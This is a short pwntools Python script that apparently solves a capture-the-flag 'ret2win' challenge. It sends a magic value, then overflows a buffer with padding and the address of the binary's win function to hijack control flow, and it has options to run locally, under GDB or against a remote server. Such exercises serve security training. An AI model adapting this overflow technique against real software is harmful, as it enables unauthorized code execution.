from pwn import *

# Allows you to switch between local/GDB/remote from terminal
def start(argv=[], *a, **kw):
    if args.GDB:  # Set GDBscript below
        return gdb.debug([exe] + argv, gdbscript=gdbscript, *a, **kw)
    elif args.REMOTE:  # ('server', 'port')
        return remote(sys.argv[1], sys.argv[2], *a, **kw)
    else:  # Run locally
        return process([exe] + argv, *a, **kw)

# Specify your GDB script here for debugging
gdbscript = '''
break *0x0000000000401272
continue
'''.format(**locals())

exe = './challenge/ret2win'
elf = context.binary = ELF(exe, checksec=False)
p = start()

p.sendline(flat(
    b'a'*12,
    0x1337c0d3
))

p.sendline(b'a'*36 + p64(elf.sym.win))

p.interactive()
